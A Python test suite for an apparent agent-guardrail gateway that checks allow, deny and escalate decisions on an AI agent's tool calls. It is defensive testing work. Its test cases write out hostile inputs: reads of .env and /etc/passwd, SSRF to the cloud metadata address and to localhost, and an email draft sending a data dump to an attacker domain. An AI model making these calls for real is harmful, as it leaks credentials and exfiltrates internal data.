"""
CloudGuard Protection Test Suite for customMCP Agent

Validates CloudGuard policy interception, heuristic risk scoring,
and security enforcement for customMCP tools.
"""

import os
import sys

# Ensure SDK is on Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "cloudguard", "sdk", "python"))

from cloudguard.client import CloudGuardClient, CloudGuardEscalatedError


def run_tests():
    gateway_url = os.getenv("CLOUDGUARD_URL", "http://localhost:8000")
    api_key = os.getenv("CLOUDGUARD_API_KEY", "cg_live_custommcp_key")
    agent_id = os.getenv("CLOUDGUARD_AGENT_ID", "00000000-0000-0000-0000-000000000002")

    print("=" * 75)
    print("🛡️  CloudGuard Protection Test Suite — customMCP Agent Interception")
    print("=" * 75)
    print(f"📡 Gateway:  {gateway_url}")
    print(f"🤖 Agent ID: {agent_id}")
    print(f"🔑 API Key:  {api_key[:16]}...")
    print("-" * 75)

    client = CloudGuardClient(
        gateway_url=gateway_url,
        api_key=api_key,
        agent_id=agent_id,
    )

    test_cases = [
        {
            "name": "1. ✅ Normal GitHub Read: get_user_profile",
            "tool": "get_user_profile",
            "params": {"username": "torvalds"},
            "expected_decisions": ["ALLOW"],
        },
        {
            "name": "2. 🚫 LFI Attack: store_file targeting .env file",
            "tool": "store_file",
            "params": {"file_path": ".env", "title": "Stolen Env Secrets"},
            "expected_decisions": ["DENY"],
        },
        {
            "name": "3. 🚫 LFI Attack: store_file targeting /etc/passwd",
            "tool": "store_file",
            "params": {"file_path": "/etc/passwd"},
            "expected_decisions": ["DENY"],
        },
        {
            "name": "4. 🚫 SSRF Attack: scrape_url targeting AWS Metadata",
            "tool": "scrape_url",
            "params": {"url": "http://169.254.169.254/latest/meta-data/"},
            "expected_decisions": ["DENY"],
        },
        {
            "name": "5. 🚫 SSRF Attack: scrape_url targeting localhost",
            "tool": "scrape_url",
            "params": {"url": "http://127.0.0.1:8000/api/v1/audit/events"},
            "expected_decisions": ["DENY"],
        },
        {
            "name": "6. ⚠️ AI Risk Analysis: analyze_content suspicious content",
            "tool": "analyze_content",
            "params": {"content": "ransomware database_dump leaks", "analysis_type": "risk_assessment"},
            "expected_decisions": ["ALLOW", "DENY", "ESCALATE"],
        },
        {
            "name": "7. ⚠️ Destructive Action: delete_calendar_event",
            "tool": "delete_calendar_event",
            "params": {"event_summary": "Q3 Board Strategy Meeting"},
            "expected_decisions": ["ESCALATE", "DENY"],
        },
        {
            "name": "8. 🚫 Email Exfiltration: create_email_draft to external domain",
            "tool": "create_email_draft",
            "params": {
                "to": "attacker@evil-external-domain.com",
                "subject": "Extracted Database Dump",
                "body": "Here is the internal data..."
            },
            "expected_decisions": ["DENY"],
        },
    ]

    passed = 0
    failed = 0

    for idx, tc in enumerate(test_cases, 1):
        print(f"\nTest {idx}: {tc['name']}")
        print(f"  Tool:   {tc['tool']}")
        print(f"  Params: {tc['params']}")

        try:
            res = client.execute(
                tool_name=tc["tool"],
                parameters=tc["params"],
                raise_on_deny=False,
            )
            decision = res.get("decision", "UNKNOWN")
            risk = res.get("risk_score", 0)
            reason = res.get("reason", "")
            latency = res.get("evaluation_latency_ms", 0)

            icon = {"ALLOW": "✅", "DENY": "🚫", "ESCALATE": "⚠️"}.get(decision, "❓")
            print(f"  {icon} Decision: {decision} | Risk Score: {risk}/100 | Latency: {latency}ms")
            print(f"  📝 Policy Reason: {reason}")

            if decision in tc["expected_decisions"]:
                print("  STATUS: PASSED")
                passed += 1
            else:
                print(f"  STATUS: FAILED (Expected one of {tc['expected_decisions']}, got {decision})")
                failed += 1

        except CloudGuardEscalatedError as e:
            decision = "ESCALATE"
            risk = e.risk_score
            reason = e.reason
            print(f"  ⚠️ Decision: {decision} | Risk Score: {risk}/100")
            print(f"  📝 Policy Reason: {reason}")

            if decision in tc["expected_decisions"]:
                print("  STATUS: PASSED")
                passed += 1
            else:
                print(f"  STATUS: FAILED (Expected one of {tc['expected_decisions']}, got {decision})")
                failed += 1

        except Exception as e:
            print(f"  ❌ Error connecting or executing test: {e}")
            failed += 1

    print("\n" + "=" * 75)
    print(f"📊 Test Summary: Total={len(test_cases)} | Passed={passed} | Failed={failed}")
    print("=" * 75)

    client.close()


if __name__ == "__main__":
    run_tests()
